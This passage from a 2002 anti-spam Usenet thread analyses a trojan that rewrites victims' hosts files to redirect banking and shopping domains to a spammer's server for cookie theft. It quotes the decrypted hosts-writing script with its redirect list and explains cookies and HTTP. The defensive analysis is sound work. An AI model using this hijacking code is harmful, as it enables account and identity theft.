+   NS.BULKREGISTER.COM           216.147.43.234                
+   NS2.BULKREGISTER.COM          216.147.1.
+
+Is this the one you mean?
+
+
+From af380@chebucto.ns.ca Sun Feb 24 13:58:31 2002
+Status: RO
+X-Status: 
+Path: News.Dal.Ca!newsflash.concordia.ca!sunqbc.risq.qc.ca!news.maxwell.syr.edu!feeder.qis.net!sn-xit-02!supernews.com!postnews1.google.com!not-for-mail
+From: solitaire5@juno.com (Sarah)
+Newsgroups: news.admin.net-abuse.email
+Subject: Re: TROJAN "hosts" FILE:WEB CONNECTION THEFT: Quick action!
+Date: 24 Feb 2002 13:58:31 -0800
+Organization: http://groups.google.com/
+Lines: 17
+Message-ID: <d7f82a0.0202241358.6dc2d412@posting.google.com>
+References: <3c7848db$1_1@nntp2.nac.net> <3c786644$1_2@nntp2.nac.net> <3C787E55.5030407@mindspring.com> <3c78934a$1_1@nntp2.nac.net>
+NNTP-Posting-Host: 172.138.217.183
+Content-Type: text/plain; charset=ISO-8859-1
+Content-Transfer-Encoding: 8bit
+X-Trace: posting.google.com 1014587913 2943 127.0.0.1 (24 Feb 2002 21:58:33 GMT)
+X-Complaints-To: groups-abuse@google.com
+NNTP-Posting-Date: 24 Feb 2002 21:58:33 GMT
+Xref: News.Dal.Ca news.admin.net-abuse.email:766812
+
+spamless@Nil.nil wrote in message news:<3c78934a$1_1@nntp2.nac.net>...
+> Mark G <bsbox@mindspring.com> wrote:
+> > spamless@nil.nil wrote:
+> >> 
+> >> Unfortunately, that is only the host that installs the Trojan "hosts" file.
+> >> If/when the spammer notices that his site is down, he can put it up
+> >> somewhere else and it will keep working. The site that steals one's
+> >> Web connection on Level3 is the one that really has to be targeted.
+>  
+> > True, but since Best-greetings was the first stop in the chain, it will 
+> > take another spam run to re-establish the chain, won't it?
+> 
+> Get another host for Best-greetings; go to the name server and set the
+> new IP address (I haven't checked it).
+
+Sorry -- didn't notice the lack of an _s_ in the name until after I
+hit the "post" button.
+
+
+From af380@chebucto.ns.ca Sun Feb 24 17:24:14 2002
+Status: RO
+X-Status: 
+From: spamless@Nil.nil
+Subject: Re: TROJAN "hosts" FILE:COOKIE THEFT: IDENTITY THEFT?
+Newsgroups: news.admin.net-abuse.email
+References: <3c7848db$1_1@nntp2.nac.net> <3c795aa3$1_1@nntp2.nac.net>
+User-Agent: tin/pre-1.4-980818 ("Laura") (UNIX) (FreeBSD/2.2.7-19980825-SNAP (i386))
+NNTP-Posting-Host: inch.com
+Message-ID: <3c79680e$1_1@nntp2.nac.net>
+Date: 24 Feb 2002 17:24:14 -0500
+X-Trace: nntp2.nac.net 1014589454 inch.com (24 Feb 2002 17:24:14 -0500)
+Lines: 152
+Path: News.Dal.Ca!newsflash.concordia.ca!sunqbc.risq.qc.ca!news.maxwell.syr.edu!newspeer1.nac.net!nntp2.nac.net!shell.inch.com!spamless
+Xref: News.Dal.Ca news.admin.net-abuse.email:766822
+
+spamless@nil.nil wrote:
+
+> I don't like cookies and this shows how dangerous it can be to use them for
+> any privileged data.
+
+Gaak.
+
+I just realized - since your cookies are sent to the spammer's site
+your cookie enabled logins are now broken. Too bad.
+
+Gaak. Gaak.
+
+I just checked. The "hosts" file has entries for
+"bankamerica.com", "wu.com" (Western Union), "money.com", "paypal.com",
+"westernunion.com", "visa.com", "ebay.com", "bestbuy.com", "money.com",
+
+This is not *just* a porn dialer installer.
+
+The spammer is harvesting your cookies sent to MSN, online banks, etc.
+
+This is cookie theft.
+
+Any data sent in clear text is his. Data in encrypted cookies is
+data he can resend to the actual sites to access your accounts.
+
+Identity theft? Bank theft?
+
+This is not bad. This is terrible.
+
+In a word (well, two words): it sucks.
+
+I updated Level3 when I realized this was cookie theft as well
+as simply stealing your web connection. They are hosting the
+theft site.
+
+> =================================================================
+> FULL LIST OF THE ENTRIES WRITTEN TO YOUR NEW TROJAN "hosts" FILE:
+> =================================================================
+> 
+> (this gives the hostnames whose connections the spammer has attempted
+>  to steal)
+> 
+>   function savefavfile(folder,label,url,icofile,iconum)
+>    var oFi=FSO.CreateTextFile(folder+"\\hosts");
+>     oFi.WriteLine("64.154.222.199 hotmail.com");
+>     oFi.WriteLine("64.154.222.199 yahoo.com");
+>     oFi.WriteLine("64.154.222.199 msn.com");
+>     oFi.WriteLine("64.154.222.199 altavista.com");
+>     oFi.WriteLine("64.154.222.199 google.com");
+>     oFi.WriteLine("64.154.222.199 paypal.com");
+>     oFi.WriteLine("64.154.222.199 ebay.com");
+>     oFi.WriteLine("64.154.222.199 buy.com");
+>     oFi.WriteLine("64.154.222.199 microsoft.com");
+>     oFi.WriteLine("64.154.222.199 icq.com");
+>     oFi.WriteLine("64.154.222.199 usa.net");
+>     oFi.WriteLine("64.154.222.199 usa.com");
+>     oFi.WriteLine("64.154.222.199 netscape.net");
+>     oFi.WriteLine("64.154.222.199 netscape.com");
+>     oFi.WriteLine("64.154.222.199 aol.com");
+>     oFi.WriteLine("64.154.222.199 web.de");
+>     oFi.WriteLine("64.154.222.199 excite.com");
+>     oFi.WriteLine("64.154.222.199 qwest.net");
+>     oFi.WriteLine("64.154.222.199 dell.com");
+>     oFi.WriteLine("64.154.222.199 hp.com");
+>     oFi.WriteLine("64.154.222.199 sony.com");
+>     oFi.WriteLine("64.154.222.199 gateway.com");
+>     oFi.WriteLine("64.154.222.199 ibm.com");
+>     oFi.WriteLine("64.154.222.199 bestbuy.com");
+>     oFi.WriteLine("64.154.222.199 prodigy.net");
+>     oFi.WriteLine("64.154.222.199 att.com");
+>     oFi.WriteLine("64.154.222.199 att.net");
+>     oFi.WriteLine("64.154.222.199 earthlink.net");
+>     oFi.WriteLine("64.154.222.199 earthlink.com");
+>     oFi.WriteLine("64.154.222.199 mail.com");
+>     oFi.WriteLine("64.154.222.199 lycos.com");
+>     oFi.WriteLine("64.154.222.199 av.com");
+>     oFi.WriteLine("64.154.222.199 mp3.com");
+>     oFi.WriteLine("64.154.222.199 hollywood.com");
+>     oFi.WriteLine("64.154.222.199 cnn.com");
+>     oFi.WriteLine("64.154.222.199 nba.com");
+>     oFi.WriteLine("64.154.222.199 nhl.com");
+>     oFi.WriteLine("64.154.222.199 nfl.com");
+>     oFi.WriteLine("64.154.222.199 usatoday.com");
+>     oFi.WriteLine("64.154.222.199 weather.com");
+>     oFi.WriteLine("64.154.222.199 money.com");
+>     oFi.WriteLine("64.154.222.199 geocities.com");
+>     oFi.WriteLine("64.154.222.199 amazon.com");
+>     oFi.WriteLine("64.154.222.199 bankamerica.com");
+>     oFi.WriteLine("64.154.222.199 wu.com");
+>     oFi.WriteLine("64.154.222.199 westernunion.com");
+>     oFi.WriteLine("64.154.222.199 c2it.com");
+>     oFi.WriteLine("64.154.222.199 visa.com");
+>     oFi.WriteLine("64.154.222.199 internet.com");
+>     oFi.WriteLine("64.154.222.199 ivillage.com");
+>     oFi.WriteLine("64.154.222.199 real.com");
+>     oFi.WriteLine("64.154.222.199 x10.com");
+>     oFi.WriteLine("64.154.222.199 about.com");
+>     oFi.WriteLine("64.154.222.199 www.hotmail.com");
+>     oFi.WriteLine("64.154.222.199 www.yahoo.com");
+>     oFi.WriteLine("64.154.222.199 www.msn.com");
+>     oFi.WriteLine("64.154.222.199 www.altavista.com");
+>     oFi.WriteLine("64.154.222.199 www.google.com");
+>     oFi.WriteLine("64.154.222.199 www.paypal.com");
+>     oFi.WriteLine("64.154.222.199 www.ebay.com");
+>     oFi.WriteLine("64.154.222.199 www.buy.com");
+>     oFi.WriteLine("64.154.222.199 www.microsoft.com");
+>     oFi.WriteLine("64.154.222.199 www.icq.com");
+>     oFi.WriteLine("64.154.222.199 www.usa.net");
+>     oFi.WriteLine("64.154.222.199 www.usa.com");
+>     oFi.WriteLine("64.154.222.199 www.netscape.net");
+>     oFi.WriteLine("64.154.222.199 www.netscape.com");
+>     oFi.WriteLine("64.154.222.199 www.aol.com");
+>     oFi.WriteLine("64.154.222.199 www.web.de");
+>     oFi.WriteLine("64.154.222.199 www.excite.com");
+>     oFi.WriteLine("64.154.222.199 www.qwest.net");
+>     oFi.WriteLine("64.154.222.199 www.dell.com");
+>     oFi.WriteLine("64.154.222.199 www.hp.com");
+>     oFi.WriteLine("64.154.222.199 www.sony.com");
+>     oFi.WriteLine("64.154.222.199 www.gateway.com");
+>     oFi.WriteLine("64.154.222.199 www.ibm.com");
+>     oFi.WriteLine("64.154.222.199 www.bestbuy.com");
+>     oFi.WriteLine("64.154.222.199 www.prodigy.net");
+>     oFi.WriteLine("64.154.222.199 www.att.com");
+>     oFi.WriteLine("64.154.222.199 www.att.net");
+>     oFi.WriteLine("64.154.222.199 www.earthlink.net");
+>     oFi.WriteLine("64.154.222.199 www.earthlink.com");
+>     oFi.WriteLine("64.154.222.199 www.mail.com");
+>     oFi.WriteLine("64.154.222.199 www.lycos.com");
+>     oFi.WriteLine("64.154.222.199 www.av.com");
+>     oFi.WriteLine("64.154.222.199 www.mp3.com");
+>     oFi.WriteLine("64.154.222.199 www.hollywood.com");
+>     oFi.WriteLine("64.154.222.199 www.cnn.com");
+>     oFi.WriteLine("64.154.222.199 www.nba.com");
+>     oFi.WriteLine("64.154.222.199 www.nhl.com");
+>     oFi.WriteLine("64.154.222.199 www.nfl.com");
+>     oFi.WriteLine("64.154.222.199 www.usatoday.com");
+>     oFi.WriteLine("64.154.222.199 www.weather.com");
+>     oFi.WriteLine("64.154.222.199 www.money.com");
+>     oFi.WriteLine("64.154.222.199 www.geocities.com");
+>     oFi.WriteLine("64.154.222.199 www.amazon.com");
+>     oFi.WriteLine("64.154.222.199 www.bankamerica.com");
+>     oFi.WriteLine("64.154.222.199 www.wu.com");
+>     oFi.WriteLine("64.154.222.199 www.westernunion.com");
+>     oFi.WriteLine("64.154.222.199 www.c2it.com");
+>     oFi.WriteLine("64.154.222.199 www.visa.com");
+>     oFi.WriteLine("64.154.222.199 www.internet.com");
+>     oFi.WriteLine("64.154.222.199 www.ivillage.com");
+>     oFi.WriteLine("64.154.222.199 www.real.com");
+>     oFi.WriteLine("64.154.222.199 www.x10.com");
+>     oFi.WriteLine("64.154.222.199 www.about.com");
+>     ...
+>     oFi.Close();}
+
+
+From af380@chebucto.ns.ca Sun Feb 24 19:01:41 2002
+Status: RO
+X-Status: 
+From: spamless@Nil.nil
+Subject: Re: TROJAN "hosts" FILE:COOKIE THEFT: IDENTITY THEFT?
+Newsgroups: news.admin.net-abuse.email
+References: <3c7848db$1_1@nntp2.nac.net> <3c795aa3$1_1@nntp2.nac.net> <3c79680e$1_1@nntp2.nac.net>
+User-Agent: tin/pre-1.4-980818 ("Laura") (UNIX) (FreeBSD/2.2.7-19980825-SNAP (i386))
+NNTP-Posting-Host: inch.com
+Message-ID: <3c797ee5$1_2@nntp2.nac.net>
+Date: 24 Feb 2002 19:01:41 -0500
+X-Trace: nntp2.nac.net 1014595301 inch.com (24 Feb 2002 19:01:41 -0500)
+Lines: 21
+Path: News.Dal.Ca!news2.muc.eurocyber.net!fu-berlin.de!news.maxwell.syr.edu!newspeer1.nac.net!nntp2.nac.net!shell.inch.com!spamless
+Xref: News.Dal.Ca news.admin.net-abuse.email:766848
+
+spamless@Nil.nil wrote:
+
+> I just realized - since your cookies are sent to the spammer's site
+> your cookie enabled logins are now broken. Too bad.
+
+> I just checked. The "hosts" file has entries for
+> "bankamerica.com", "wu.com" (Western Union), "money.com", "paypal.com",
+> "westernunion.com", "visa.com", "ebay.com", "bestbuy.com", "money.com",
+
+> This is cookie theft.
+
+I just got off the phone with security at Level3 (who was paged at home),
+explained what was going on and sent him a copy of the spam, original web 
+page, decrypted web page (the code that creates the Trojan "hosts" file), 
+the list of hostnames that are redirected to their hosted "customer" and 
+an explanation.
+
+He said he'd look at it tomorrow (Monday, 25 January 2002).
+
+(uce@ftc.gov did not like the attachment since it contained script - 
+ it flagged that as a virus)
+
+
+From af380@chebucto.ns.ca Mon Feb 25 06:39:28 2002
+Status: RO
+X-Status: 
+Path: News.Dal.Ca!torn!news-out.cwix.com!newsfeed.cwix.com!newsfeed.nyc.globix.net!news.stealth.net!teleglobe.net!teleglobe.net!teleglobe.net!66.185.86.143.MISMATCH!news03.bloor.is!news2.bloor.is.POSTED!12dc6cf53ab2750!not-for-mail
+Message-ID: <3C79DC18.143B0850@rogers.com>
+From: David Ramalho <earthscibbs@rogers.com>
+Organization: ***EarthScibbs***
+X-Mailer: Mozilla 4.79 [en] (Win95; U)
+X-Accept-Language: en,pdf
+MIME-Version: 1.0
+Newsgroups: news.admin.net-abuse.email
+Subject: Re: TROJAN "hosts" FILE:COOKIE THEFT: IDENTITY THEFT?
+References: <3c7848db$1_1@nntp2.nac.net> <3c795aa3$1_1@nntp2.nac.net> <3c79680e$1_1@nntp2.nac.net> <3c797ee5$1_2@nntp2.nac.net>
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+Lines: 53
+Date: Mon, 25 Feb 2002 06:39:28 GMT
+NNTP-Posting-Host: 24.100.247.48
+X-Complaints-To: abuse@rogers.com
+X-Trace: news2.bloor.is 1014619168 24.100.247.48 (Mon, 25 Feb 2002 01:39:28 EST)
+NNTP-Posting-Date: Mon, 25 Feb 2002 01:39:28 EST
+Xref: News.Dal.Ca news.admin.net-abuse.email:766979
+
+spamless@Nil.nil wrote:
+> 
+> spamless@Nil.nil wrote:
+> 
+> > I just realized - since your cookies are sent to the spammer's site
+> > your cookie enabled logins are now broken. Too bad.
+> 
+> > I just checked. The "hosts" file has entries for
+> > "bankamerica.com", "wu.com" (Western Union), "money.com", "paypal.com",
+> > "westernunion.com", "visa.com", "ebay.com", "bestbuy.com", "money.com",
+> 
+> > This is cookie theft.
+> 
+> I just got off the phone with security at Level3 (who was paged at home),
+> explained what was going on and sent him a copy of the spam, original web
+> page, decrypted web page (the code that creates the Trojan "hosts" file),
+> the list of hostnames that are redirected to their hosted "customer" and
+> an explanation.
+> 
+> He said he'd look at it tomorrow (Monday, 25 January 2002).
+> 
+> (uce@ftc.gov did not like the attachment since it contained script -
+>  it flagged that as a virus)
+
+ Good evening
+
+ You should also try:
+
+FBI <internetfraud@ifccfbi.gov>
+
+Secret Service <419.fcd@usss.treas.gov>
+
+ Internet Fraud Complaint Center (IFCC) FBI site
+  http://www1.ifccfbi.gov/index.asp
+
+  Federal Trade Commission
+  http://www.ftc.gov/
+
+ Colorado - Attorney General (where level3.net is located)
+ http://www.ago.state.co.us/
+
+ NATIONAL CHECK FRAUD CENTER
+ http://www.ckfraud.org/
+
+ European Anti-Fraud Office
+  - there is the German connection
+ http://europa.eu.int/comm/dgs/olaf/
+
+ Financial Crimes Enforcement Network (FinCEN)
+  http://www.treas.gov/fincen/
+
+ Regards
+ David Ramalho
+
+
+From af380@chebucto.ns.ca Mon Feb 25 04:10:54 2002
+Status: RO
+X-Status: 
+From: spamless@Nil.nil
+Subject: Re: TROJAN "hosts" FILE:COOKIE THEFT: IDENTITY THEFT?
+Newsgroups: news.admin.net-abuse.email
+References: <3c7848db$1_1@nntp2.nac.net> <3c795aa3$1_1@nntp2.nac.net> <3c79680e$1_1@nntp2.nac.net> <n3mj7u83261j2u3qkldr9dko4tdekqvbfq@4ax.com>
+User-Agent: tin/pre-1.4-980818 ("Laura") (UNIX) (FreeBSD/2.2.7-19980825-SNAP (i386))
+NNTP-Posting-Host: inch.com
+Message-ID: <3c79ff9e$1_1@nntp2.nac.net>
+Date: 25 Feb 2002 04:10:54 -0500
+X-Trace: nntp2.nac.net 1014628254 inch.com (25 Feb 2002 04:10:54 -0500)
+Lines: 135
+Path: News.Dal.Ca!news2.muc.eurocyber.net!fu-berlin.de!hub1.nntpserver.com!newspeer1.nac.net!nntp2.nac.net!shell.inch.com!spamless
+Xref: News.Dal.Ca news.admin.net-abuse.email:766997
+
+Tom Porter <spammersarevermin@krumpli.com> wrote:
+
+> Could you please explain how this happens in more detail? Thanks...
+
+Cookies. Little data bits stored on your computer in the form:
+"name=data" which have an associated "host" (and expiration date).
+
+When you go to a URL, your browser resolves that to an IP address
+(it connects to IP addresses), connects, looks through the list
+of cookies, sees which ones have this "host" associated with it,
+and sends that information in the header of the http-protocol
+requests you send to that host. That data is saved by the web
+server and it can examine it and take actions based on the data.
+
+For example, it can open your hotmail mailbox.
+It can log you to your amazon page (and ready amazon for
+its patented "one click" purchase).
+
+Only the host web server need be able to read the cookie so
+the data may be encrypted.
+
+You can give your friend a cookie file and he can use it to
+log in as you.
+
+Luckily, for most systems, really critical data is not saved
+in cookies. Unfortunately, it may be saved on their secure
+systems and be accessible after you log-in with your password
+which may be sent in an encrypted cookie.
+
+The cookie data is sent to the host when you connect to that
+IP address (the one it found and to which it connects and to
+which it sends the http-protocol requests for pages).
+-----------------------------------------------------
+
+How to get the IP address for a hostname (such as hotmail)?
+Back in the old days of ARPA net, there were only a few machines.
+There was no distributed nameserver system. Each machine had
+a database/list called a "hosts" file.
+
+ numeric_address hostname
+
+and, when trying to determine how to connect to a hostname,
+would look up the hostname in the list to find the numeric_address
+to use.
+
+"hosts" files are still used. Most of us don't use them on
+home systems. IF there is a hosts file, your browser (and other
+programmes) in trying to determine the IP address to which
+to connect when we want to reach a given hostname will:
+
+1: Check for a "hosts" file. If there is none it uses
+   whatever other resolver you have set.
+2: If there is a hosts file, it looks for the IP address
+   for the hostname there. If it finds it there, it uses
+   that as the IP address of the hostname. IF it does not
+   find it, it uses whatever other resolver you have set.
+
+On home machines, the resolver it will use (if it does not
+find an IP address in a "hosts" file) is to check for the 
+IP address by asking your local ISP's nameservers for the 
+IP address (that is why you have to enter your ISP's 
+nameservers in your internet connection - unless they are 
+assigned dynamically by your ISP). Your ISP's nameserver 
+will get the information from other nameservers (recursive 
+lookup) and return it to your system so it has an IP address 
+and can connect to the host.
+
+If someone can convince your system that the IP address for
+www.msn.com is "123.123.123.123", then when you enter
+"http://www.msn.com/some_path/some_file.htm" it will connect 
+to "www.msn.com" by sending data to the IP address 
+"123.123.123.123" - it will send http-protocol messages,
+posts, GET requests, its cookies, etc. to this IP address.
+
+You may have seen folks here mention that they block some
+site (such as doubleclick) by entering a value in the "hosts"
+file assigning the hostname to the IP address "127.0.0.1"
+(127.0.0.1 is a reserved IP address which just points to the
+same machine - it must means "me, this machine, this is not
+some other machine"). This convinces everything on your machine
+to use that IP address in attempting to connect to that site.
+The result is that it never looks up the real IP address
+of doubleclick and never sends them any cookie data that
+they may use to track you.
+
+This spammer attempts to write a "hosts" file to your computer.
+It will replace namesystem lookups for the hostnames he writes
+to the file. It puts his IP address in for many hosts. In
+attempting to connect to any of those hostnames, your machine
+will connect to his system (will use his IP address as that
+of the hostnames). It will send cookies, etc. to that machine
+assuming it is the IP address of the hostname.
+
+Among the hostnames he inserts in the "hosts" file he creates
+(or tries to create) are bankamerica.com, westernunion.com,
+wu.com (western union again), paypal.com, visa.com, buy.com,
+amazon.com, hotmail.com, msn.com, bestbuy.com, gateway.com,
+aol.com, etc. (check the list in the message I posted).
+
+For all those hosts, your machine will think they are located
+at his IP address and connect there (he uses a frameset redirector
+to show you the actual site, but your machine will send the cookies
+to the spammer).
+
+Once he has a cookie "name=data" he can later connect to the
+real host and send that cookie himself (your cookie data).
+If the site uses cookies to save and receive your password
+or data, the spammer has just logged in as you.
+If the cookie can be read (plain text), he can just read it
+and see what the data is.
+
+You can examine your "cookies.txt" file (Netscape) or the
+individual cookie files (Internet Explorer) in Notepad or
+other plain text viewer. Many of them will look like junk
+data (encrypted).
+
+For example, I see some with names
+
+ "username" with a value which is my username (in clear text)
+            for my login to the (London) Sunday Times.
+ NS_REG2_USERLOGIN with an obscure value for Netscape.com.
+ I see another one for Netscape which has my email address
+  (the one I used there: Spamless@nil.nil)
+ (I don't have many cookies)
+
+(the format of the cookie text file, the data that is
+ sent as a "name=data" pair may not be exactly in
+ that form.
+ It may be (as it is for Netscape):
+  hostname, path, expiration_date(*), name, data
+ (with some boolean values in there as well)
+
+ (*): In netscape this is given as an integer.
+      Some number of hours? or minutes? or days?
+      from some fixed time.
+
+
+From af380@chebucto.ns.ca Mon Feb 25 05:08:26 2002
+Status: RO
+X-Status: 
+From: spamless@Nil.nil
+Subject: Re: TROJAN "hosts" FILE:COOKIE THEFT: IDENTITY THEFT?
+Newsgroups: news.admin.net-abuse.email
+References: <3c7848db$1_1@nntp2.nac.net> <3c795aa3$1_1@nntp2.nac.net> <3c79680e$1_1@nntp2.nac.net> <n3mj7u83261j2u3qkldr9dko4tdekqvbfq@4ax.com> <3c79ff9e$1_1@nntp2.nac.net>
+User-Agent: tin/pre-1.4-980818 ("Laura") (UNIX) (FreeBSD/2.2.7-19980825-SNAP (i386))
+NNTP-Posting-Host: inch.com
+Message-ID: <3c7a0d1a_1@nntp2.nac.net>
+Date: 25 Feb 2002 05:08:26 -0500
+X-Trace: nntp2.nac.net 1014631706 inch.com (25 Feb 2002 05:08:26 -0500)
+Lines: 186
+Path: News.Dal.Ca!newsflash.concordia.ca!nntp.cs.ubc.ca!logbridge.uoregon.edu!newspeer1.nac.net!nntp2.nac.net!shell.inch.com!spamless
+Xref: News.Dal.Ca news.admin.net-abuse.email:767000
+
+spamless@Nil.nil wrote:
+
+> When you go to a URL, your browser resolves that to an IP address
+> (it connects to IP addresses), connects, looks through the list
+> of cookies, sees which ones have this "host" associated with it,
+> and sends that information in the header of the http-protocol
+> requests you send to that host. That data is saved by the web
+> server and it can examine it and take actions based on the data.
+
+In detail.
+
+When getting a web page your browser will, after getting the IP address
+connect to port 80 at that IP address and send the following lines of
+text (this is to get a page):
+
+GET /the_path_to/the_page.html HTTP/1.1
+User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)
+Cookie: name1=data1; name2=data2; name3=data3 
+Host: www.nytimes.com
+Referrer: the_URL_of_the_page_with_the_link_you_clicked
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
+
+It then sends one blank line.
+
+The web server then does something with the information you sent
+and returns (hopefully) the page you requested.
+
+There may be other headers which are sent. Or fewer.
+
+ The User-Agent will, of course, specify your browser.
+ 
+ The cookie data will look up the various cookies that you
+ may have received for this host and send them all.
+
+ The Host specifies the hostname (if the system uses virtual
+ hosting, for example, jane.com and jim.com at the same IP
+ address, the "Host:" header will be used to decide which
+ set of web pages you should get - do you want jane's
+ index.html page or jim's?).
+
+ The Accept line indicates which mime types your system
+ would like.
+
+Anther header that might be sent:
+
+ From: your_email_address
+  (I don't think any browser now still sends that - I guess there
+   might have been one somewhere - though I believe you can
+   configure Netscape and Lynx to send the "From:" header if you
+   want to - in Netscape you would have to edit the prefs.js file,
+   I believe.)
+
+You can do this manually. Telnet to port 80 at some machine and
+type in those lines and a blank line to get the page. That way,
+you could telnet to the London Times and enter a "Host:" field
+in the header of "Host: www.nytimes.com" and let them wonder
+how you managed to get to London when you wanted New York!
+If a site has multiple IP addresses listed (as one can get
+from checking at its nameserver) you can telnet to each
+IP address on port 80 (the default port - if the URL has
+a different port number listed, use that) and enter the
+data manually (with the Host: header) to check that the same
+site is available at the multiple IP addresses (which may
+be used for load balancing) (that is how I checked, for example,
+that Empire Towers' site was available at the four IP addresses
+they had been using - now they seem to be back to one).
+There is software, such as "curl", which makes it easier
+to specify data and configure what is sent precisely as
+you want.
+------------------------------------------------------
+
+The data you get back will consist of a few lines (header)
+(with the response code, such as "200" for success,
+ "302" or "301" for a redirection, "404" for page not found,
+ etc.) followed by a blank line and then the actual data
+(you can have a page sent with a "404", page not found, header
+which is usually sent by systems to indicate why the page is
+missing or to offer to search for it. Besides the GET request,
+to get a page, one can use a HEAD request just to get the
+header to see if the page is there. A few spammers have
+systems which return "404" headers and then the page that
+is really there. An abuse desk which uses a HEAD request
+to see the status of the page will think it is down. One which
+uses a GET request may think it is down, until they scroll past
+all the blank lines and tab characters to find the page that
+the spammer is trying to hide - he wants folks to think the
+"404" header is real).
+
+Here is a sample response from getting a page on the NY Times:
+
+HTTP/1.1 200 OK
+Server: Netscape-Enterprise/4.1
+Date: Mon, 25 Feb 2002 09:22:36 GMT
+Set-cookie: RMID=(data_omittted); expires=Tuesday, 25-Feb-2003 09:22:36 GMT; path=/; domain=.nytimes.com
+Set-cookie: spopunder=1; path=/; domain=.nytimes.com
+Cache-control: no-cache
+Pragma: no-cache
+Content-type: text/html
+Connection: close
+
+(then a blank line, then the page)
+
+(while the browser only sends ONE "Cookie" line in,
+ servers can send several "Set-cookie" lines.
+ In this case, the first cookie, for example,
+ sets a cookie with name RMID, and some value.
+ It sets its expiration data and specifies that it
+ is valid for .nytimes.com (the extra dot at the
+ front means it will work for www.nytimes.com,
+ www1.nytimes.com, anthing.else.nytimes.com)
+ It specifies the path as "/" (root) so it will work
+ for anything under that path (e.g. /anything/anything.html)
+ - some cookies may only work with a path /pages, for example,
+ which would work for /pages/joe/his_page.html but not for
+ /files/joe/his_file.html)
+
+Here is an example of a redirection header.
+Note that all systems require a proper URL.
+Directories end in slashes! If you send a URL which ends
+in a directory, it will check to see if the directory exists,
+but not give you the default page therein. This is important
+(in the example I am going to use, I will use the directory
+/~f60a on home.earthlink.net, which is a directory the
+CyberDetective spammer is using).
+
+Suppose the system DID return the default page in the
+directory "http://home.earthlink.net/~f60a/" when you
+enter the URL "http://home.earthlink.net/~f60a". Now what
+happens if that has a relative URL in a link (e.g. "otherpage.htm")?
+Your browser will happily think this is 
+"http://home.earthlink.net/otherpage.htm" (it was not told that
+"~f60a" was a directory). On the other hand, if you used the
+URL "http://home.earthlink.net/~f60a/" (to get the default page)
+your browser would recognize "otherpage.htm" as referring to 
+"http://home.earthlink.net/~f60a/otherpage.htm".
+
+However, many folk do NOT put in the slash at the end of URLs that
+point to directories. To fix that, the web server will check.
+If there is no page, but a directory with that name, it will send
+a redirect to the "proper" URL (the one ending in a slash).
+This is what earthlink sends back to the request for
+"http://home.earthlink.net/~f60a"
+
+SENT:
+
+GET /~f60a HTTP/1.1
+User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)
+Host: home.earthlink.net
+Pragma: no-cache
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
+
+(then a blank line)
+
+RECEIVED:
+
+HTTP/1.1 301 Moved Permanently
+Date: Mon, 25 Feb 2002 09:53:28 GMT
+Server: Apache/1.3.12 (Unix)
+Location: http://home.earthlink.net/~f60a/
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=iso-8859-1
+
+(then a blank line, then a page which also indicates that
+ the page has moved in case your browser does not automatically
+ follow redirection headers)
+
+[A "301" redirection instructs the browser that from now on
+ it should use "http://home.earthlink.net/~f60a/" anytime
+ it sees the URL "http://home.earthlink.net/~f60a".
+
+ A "302" header instructs the browser that this time it should
+ use "http://home.earthlink.net/~f60a/", but for future
+ requests, it should go back to using "http://home.earthlink.net/~f60a"
+ - which can be used if the page has only temporarily moved.]
+
+Your browser does not show you the header (but may/probably_does
+save the header somewhere in cache along with the page) but just
+the page. Since the header is in cache, you can examine it to
+see if there was a "302" redirect to another site (or, if you
+enter the data manually for the GET request by telnetting to the site 
+you will see the header come back to you before the page - again,
+there is software that will capture pages with the headers to
+make it easier to see what is going on).
+
+[That was a bit more than you wanted to know when you asked for
+ "details," wasn't it?]
+
+
+From af380@chebucto.ns.ca Mon Feb 25 10:24:24 2002
+Status: RO
+X-Status: 
+Path: News.Dal.Ca!newsflash.concordia.ca!sunqbc.risq.qc.ca!news-hog.berkeley.edu!ucberkeley!enews.sgi.com!news.tamu.edu!scully.tamu.edu!not-for-mail
+From: wej3715@scully.tamu.edu (wej3715)
+Newsgroups: news.admin.net-abuse.email
+Subject: Re: TROJAN "hosts" FILE:COOKIE THEFT: IDENTITY THEFT?
+Date: 25 Feb 2002 10:24:24 GMT
+Organization: Texas A&M University, College Station, Texas
+Lines: 14
+Message-ID: <a5d3co$dcu$1@news.tamu.edu>
+References: <3c7848db$1_1@nntp2.nac.net> <3c795aa3$1_1@nntp2.nac.net> <3c79680e$1_1@nntp2.nac.net> <n3mj7u83261j2u3qkldr9dko4tdekqvbfq@4ax.com> <3c79ff9e$1_1@nntp2.nac.net>
+NNTP-Posting-Host: unix.tamu.edu
+NNTP-Posting-Date: 25 Feb 2002 10:24:24 GMT
+X-Newsreader: TIN [UNIX 1.3 950824BETA PL0]
+Xref: News.Dal.Ca news.admin.net-abuse.email:767005
+
+spamless@Nil.nil wrote:
+: How to get the IP address for a hostname (such as hotmail)?
+: Back in the old days of ARPA net, there were only a few machines.
+: There was no distributed nameserver system. Each machine had
+: a database/list called a "hosts" file.
+
+It used to be that the first thing I'd look for when ftping
+into a new machine was the hosts file.  If it was accessible,
+and it always was, I'd download it and merge it with mine.
+
+I used to see host files that were a megabyte or bigger in size
+on occasion.
+
+Eric Johnson
+
+
+From af380@chebucto.ns.ca Mon Feb 25 05:49:00 2002
+Status: RO
+X-Status: 
+Path: News.Dal.Ca!news2.muc.eurocyber.net!newsfeed4.cidera.com!newsfeed1.cidera.com!Cidera!netnews.com!xfer02.netnews.com!newsfeed2.earthlink.net!newsfeed.earthlink.net!newsfeed0.news.atl.earthlink.net!news.atl.earthlink.net!news.mindspring.net!not-for-mail
+From: "Mark G" <bsbox@mindspring.com>
+Newsgroups: news.admin.net-abuse.email
+Subject: Re: TROJAN "hosts" FILE:WEB CONNECTION THEFT: Quick action!
+Date: Mon, 25 Feb 2002 05:49:00 -0700
+Organization: MindSpring Enterprises
+Lines: 18
+Message-ID: <a5dbqg$1ct$1@slb7.atl.mindspring.net>
+References: <3c7848db$1_1@nntp2.nac.net> <3c786644$1_2@nntp2.nac.net> <3C787E55.5030407@mindspring.com> <3c78934a$1_1@nntp2.nac.net> <d7f82a0.0202241358.6dc2d412@posting.google.com>
+NNTP-Posting-Host: d1.56.ce.8b
